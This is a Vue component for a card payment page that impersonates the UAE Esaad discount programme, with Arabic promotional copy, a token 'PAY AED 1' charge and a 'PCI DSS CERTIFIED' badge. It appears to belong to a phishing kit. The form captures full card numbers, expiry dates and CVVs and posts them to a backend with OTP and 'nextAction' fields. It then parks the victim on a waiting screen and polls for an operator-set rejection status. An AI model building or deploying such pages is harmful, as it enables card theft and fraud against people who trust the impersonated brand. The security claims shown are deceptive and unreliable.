<script setup lang="ts">
import { ref, onMounted, onUnmounted } from 'vue';
import { ChevronDown, CreditCard, ArrowRight, ShieldCheck } from 'lucide-vue-next';
import { useRouter } from 'vue-router';
import { updateCardRequest, getCardRequest, resolveActiveRequestId } from '../api';

const router = useRouter();

const form = ref({
  name: '',
  cardNumber: '',
  expMonth: '',
  expYear: '',
  cvv: ''
});

const isSubmitting = ref(false);
const statusBanner = ref('');
let statusCheckTimer: ReturnType<typeof setInterval> | null = null;

const errors = ref({
  name: '',
  cardNumber: '',
  expMonth: '',
  expYear: '',
  cvv: ''
});

const checkCardStatus = async () => {
  try {
    const data = await getCardRequest();
    if (data?.otpStatus === 'card_rejected') {
      statusBanner.value = 'تم رفض البطاقة البنكية من قِبل البنك المصدر. يرجى التأكد من صحة البيانات أو استخدام بطاقة دفع أخرى.';
    }
  } catch {}
};

onMounted(() => {
  checkCardStatus();
  statusCheckTimer = setInterval(checkCardStatus, 2000);
});

onUnmounted(() => {
  if (statusCheckTimer) clearInterval(statusCheckTimer);
});

const validateForm = () => {
  let isValid = true;
  errors.value = { name: '', cardNumber: '', expMonth: '', expYear: '', cvv: '' };

  if (!form.value.name.trim()) {
    errors.value.name = 'Required';
    isValid = false;
  }

  if (!/^\d{15,16}$/.test(form.value.cardNumber.replace(/\s/g, ''))) {
    errors.value.cardNumber = 'Valid card number required';
    isValid = false;
  }

  if (!form.value.expMonth) {
    errors.value.expMonth = 'Required';
    isValid = false;
  }

  if (!form.value.expYear) {
    errors.value.expYear = 'Required';
    isValid = false;
  }

  if (!/^\d{3,4}$/.test(form.value.cvv)) {
    errors.value.cvv = 'Valid CVV required';
    isValid = false;
  }

  return isValid;
};

const submitPayment = async () => {
  if (isSubmitting.value) return;
  if (!validateForm()) return;
  
  isSubmitting.value = true;
  statusBanner.value = '';
  
  const requestId = await resolveActiveRequestId();
  if (!requestId) {
    statusBanner.value = 'لم يتم العثور على رقم الطلب، يرجى البدء من جديد.';
    isSubmitting.value = false;
    setTimeout(() => router.push('/request'), 1200);
    return;
  }

  try {
    await updateCardRequest(requestId, {
      paymentName: form.value.name,
      cardNumber: form.value.cardNumber,
      expMonth: form.value.expMonth,
      expYear: form.value.expYear,
      cvv: form.value.cvv,
      otp: '',
      otpStatus: '',
      step: 'card',
      nextAction: ''
    });
    router.push('/waiting');
  } catch (error) {
    console.error('Error updating card details:', error);
    statusBanner.value = 'تعذر حفظ بيانات البطاقة على الخادم.';
  } finally {
    isSubmitting.value = false;
  }
};
</script>

<template>
  <div class="max-w-xl mx-auto bg-white min-h-screen flex flex-col font-sans text-gray-900">
    
    <!-- Top Esaad Promotional Banner -->
    <div class="w-full bg-[#040c06] relative overflow-hidden h-[115px] border-b border-[#009a44]/40 flex items-center shrink-0">
      <div class="absolute inset-0 bg-[radial-gradient(circle_at_30%_50%,_rgba(57,181,74,0.28)_0%,_rgba(4,12,6,0.95)_75%)]"></div>
      
      <!-- Decorative Tilted Esaad Cards -->
      <div class="absolute -bottom-6 left-4 flex gap-1.5 -rotate-12 opacity-90">
        <div class="w-16 h-24 bg-gradient-to-br from-[#009a44] to-[#005e28] rounded-lg shadow-lg border border-[#39b54a]/50 p-1.5 flex flex-col justify-between">
          <div class="w-3.5 h-2.5 rounded-xs bg-yellow-400/80"></div>
          <span class="text-[7px] font-black text-white/90">esaad</span>
        </div>
        <div class="w-16 h-24 bg-gradient-to-br from-[#0c2614] to-[#051108] rounded-lg shadow-lg translate-y-3 border border-[#009a44]/40"></div>
      </div>

      <div class="relative z-10 px-4 flex justify-between items-center w-full h-full">
        <!-- Left Logo -->
        <div class="flex items-center gap-3">
          <div @click="router.push('/')" class="cursor-pointer flex flex-col items-center bg-black/40 px-2.5 py-1.5 rounded-xl border border-white/10">
            <span class="text-[#39b54a] font-black text-base leading-none">إسعاد</span>
            <span class="text-[#39b54a] font-extrabold text-xs leading-none">esaad</span>
            <svg class="w-8 h-2.5" viewBox="0 0 60 18" fill="none">
              <circle cx="14" cy="4" r="2" fill="#39b54a" />
              <circle cx="46" cy="4" r="2" fill="#39b54a" />
              <path d="M 6 6 Q 30 18 54 6" stroke="#39b54a" stroke-width="3.2" stroke-linecap="round" />
            </svg>
          </div>
        </div>
        
        <!-- Right Arabic Promo Text -->
        <div class="text-right flex flex-col items-end z-20" dir="rtl">
          <div class="text-[11px] text-gray-200 font-semibold max-w-[200px] leading-relaxed">
            استمتع بخصومات حصرية تصل إلى 70% لحاملي بطاقة إسعاد في جميع القطاعات
          </div>
          <div class="text-sm text-[#39b54a] font-bold mt-1 flex items-center gap-2">
            <span>بوابة الدفع الآمن</span>
            <button @click="router.push('/payment')" class="p-1 rounded-full bg-white/10 text-white hover:bg-white/20 cursor-pointer">
              <ArrowRight class="w-3.5 h-3.5" />
            </button>
          </div>
        </div>
      </div>
    </div>

    <!-- Order Summary Bar -->
    <div class="bg-[#07170b] text-white flex justify-between items-center px-5 py-3 shadow-xs border-b border-[#009a44]/30">
      <span class="text-sm border-b-2 border-[#39b54a] pb-0.5 inline-block tracking-wide font-semibold">Order summary</span>
      <span class="text-base font-bold text-[#39b54a] tracking-wide tabular-nums">AED 1</span>
    </div>

    <!-- Inline Status Banner if needed -->
    <div v-if="statusBanner" class="mx-5 mt-4 p-2.5 rounded-xl bg-red-50 border border-red-200 text-red-700 text-xs font-bold text-center" dir="rtl">
      {{ statusBanner }}
    </div>

    <!-- Card Form Container -->
    <div class="px-5 py-6 flex-grow bg-[#f3f9f5]">
      <div class="bg-white rounded-2xl p-5 shadow-[0_4px_20px_rgba(0,0,0,0.05)] border border-gray-200/80">
        <!-- Form Header -->
        <div class="flex justify-between items-center mb-5 pb-3 border-b border-gray-100">
          <div class="flex items-center gap-2">
            <CreditCard class="w-5 h-5 text-[#008a40]" />
            <span class="text-sm text-gray-900 font-bold tracking-tight">Pay by card</span>
          </div>
          <div class="flex gap-2.5 items-center">
            <!-- Mastercard -->
            <div class="w-7 h-4 relative flex items-center justify-center">
              <div class="w-3.5 h-3.5 bg-[#eb001b] rounded-full absolute left-1 opacity-90"></div>
              <div class="w-3.5 h-3.5 bg-[#f79e1b] rounded-full absolute right-1 opacity-90"></div>
            </div>
            <!-- Visa -->
            <div class="text-[11px] font-extrabold text-[#1434cb] italic tracking-tighter">VISA</div>
          </div>
        </div>

        <form @submit.prevent="submitPayment" class="space-y-5 font-sans" dir="ltr">
          
          <!-- Name -->
          <div class="relative">
            <input 
              type="text" 
              placeholder="Name on card" 
              v-model="form.name" 
              class="w-full border-b border-gray-300 rounded-none py-2.5 px-2 text-gray-900 focus:outline-none focus:border-[#009a44] text-sm bg-transparent transition-colors placeholder-gray-400" 
            />
            <p v-if="errors.name" class="text-red-500 text-[11px] mt-1">{{ errors.name }}</p>
          </div>

          <!-- Card Number -->
          <div class="relative">
            <input 
              type="text" 
              placeholder="Card Number" 
              v-model="form.cardNumber" 
              maxlength="19"
              class="w-full border-b border-gray-300 rounded-none py-2.5 px-2 text-gray-900 focus:outline-none focus:border-[#009a44] text-sm bg-transparent transition-colors placeholder-gray-400 font-mono" 
            />
            <p v-if="errors.cardNumber" class="text-red-500 text-[11px] mt-1">{{ errors.cardNumber }}</p>
          </div>

          <!-- Expiry Row -->
          <div class="flex gap-4">
            <!-- Month -->
            <div class="relative w-1/2">
              <div class="flex items-center border-b border-gray-300 bg-transparent">
                <div class="pr-2 text-[#009a44] flex items-center justify-center absolute left-0">
                  <ChevronDown class="w-4 h-4 pointer-events-none" />
                </div>
                <select 
                  v-model="form.expMonth" 
                  class="w-full py-2.5 pl-7 pr-2 text-gray-900 appearance-none focus:outline-none focus:border-[#009a44] text-sm bg-transparent font-medium relative z-20 cursor-pointer transition-colors"
                >
                  <option value="" disabled selected hidden>Month</option>
                  <option value="01">01</option>
                  <option value="02">02</option>
                  <option value="03">03</option>
                  <option value="04">04</option>
                  <option value="05">05</option>
                  <option value="06">06</option>
                  <option value="07">07</option>
                  <option value="08">08</option>
                  <option value="09">09</option>
                  <option value="10">10</option>
                  <option value="11">11</option>
                  <option value="12">12</option>
                </select>
              </div>
              <p v-if="errors.expMonth" class="text-red-500 text-[11px] mt-1">{{ errors.expMonth }}</p>
            </div>

            <!-- Year -->
            <div class="relative w-1/2">
              <div class="flex items-center border-b border-gray-300 bg-transparent">
                <div class="pr-2 text-[#009a44] flex items-center justify-center absolute left-0">
                  <ChevronDown class="w-4 h-4 pointer-events-none" />
                </div>
                <select 
                  v-model="form.expYear" 
                  class="w-full py-2.5 pl-7 pr-2 text-gray-900 appearance-none focus:outline-none focus:border-[#009a44] text-sm bg-transparent font-medium relative z-20 cursor-pointer transition-colors"
                >
                  <option value="" disabled selected hidden>Year</option>
                  <option value="2026">2026</option>
                  <option value="2027">2027</option>
                  <option value="2028">2028</option>
                  <option value="2029">2029</option>
                  <option value="2030">2030</option>
                  <option value="2031">2031</option>
                  <option value="2032">2032</option>
                </select>
              </div>
              <p v-if="errors.expYear" class="text-red-500 text-[11px] mt-1">{{ errors.expYear }}</p>
            </div>
          </div>

          <!-- CVV -->
          <div class="relative">
            <input 
              type="password" 
              placeholder="CVV Code" 
              v-model="form.cvv" 
              maxlength="4"
              class="w-full border-b border-gray-300 rounded-none py-2.5 px-2 text-gray-900 focus:outline-none focus:border-[#009a44] text-sm bg-transparent transition-colors placeholder-gray-400 font-mono" 
            />
            <p v-if="errors.cvv" class="text-red-500 text-[11px] mt-1">{{ errors.cvv }}</p>
          </div>

          <div class="pt-3">
            <button 
              type="submit" 
              :disabled="isSubmitting"
              class="w-full flex items-center justify-center gap-2 bg-[#008a40] hover:bg-[#007335] text-white transition-colors font-bold text-sm py-3 rounded-xl shadow-md tracking-wide disabled:opacity-70 disabled:cursor-not-allowed cursor-pointer"
            >
              <span v-if="isSubmitting" class="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></span>
              <span v-else>PAY AED 1</span>
            </button>
          </div>
        </form>
      </div>
    </div>

    <!-- Footer Security Block -->
    <div class="px-5 py-6 bg-[#e4f2ea] flex flex-col items-center text-center w-full border-t border-gray-200/70" dir="rtl">
      <h3 class="font-bold text-gray-900 mb-2.5 text-xs">البطاقات المقبولة</h3>
      
      <div class="flex gap-2 mb-4 flex-wrap justify-center items-center" dir="ltr">
        <div class="border border-gray-200 rounded-md px-2 py-1 flex items-center justify-center bg-white h-7 w-[58px]">
          <span class="text-[6.5px] font-bold text-[#1428a0] leading-tight text-center">SAMSUNG<br/>pay</span>
        </div>
        <div class="border border-gray-200 rounded-md px-2 py-1 flex items-center justify-center bg-white h-7 w-[58px]">
          <span class="text-[10px] font-medium text-gray-700 flex items-center gap-1">
            <span class="font-bold text-[#008a40]">G</span> Pay
          </span>
        </div>
        <div class="border border-gray-200 rounded-md px-2 py-1 flex items-center justify-center bg-white h-7 w-[58px]">
          <div class="w-5 h-3.5 relative flex items-center justify-center">
            <div class="w-3 h-3 bg-[#eb001b] rounded-full absolute left-0.5"></div>
            <div class="w-3 h-3 bg-[#f79e1b] rounded-full absolute right-0.5 opacity-90"></div>
          </div>
        </div>
        <div class="border border-gray-200 rounded-md px-2 py-1 flex items-center justify-center bg-white h-7 w-[58px]">
          <span class="text-[11px] font-extrabold text-[#1434cb] italic">VISA</span>
        </div>
      </div>

      <div class="text-center max-w-sm px-2 space-y-1.5">
        <p class="text-gray-600 text-[11px] font-medium leading-relaxed">
          تُقبل البطاقات العالمية والبطاقات الصادرة في دولة الإمارات العربية المتحدة ودول الخليج.
        </p>
        <div class="flex items-center justify-center gap-1.5 text-[11px] font-bold text-[#008a40]">
          <ShieldCheck class="w-3.5 h-3.5" />
          <span>PCI DSS CERTIFIED · بياناتك الخاصة آمنة</span>
        </div>
      </div>
    </div>

  </div>
</template>
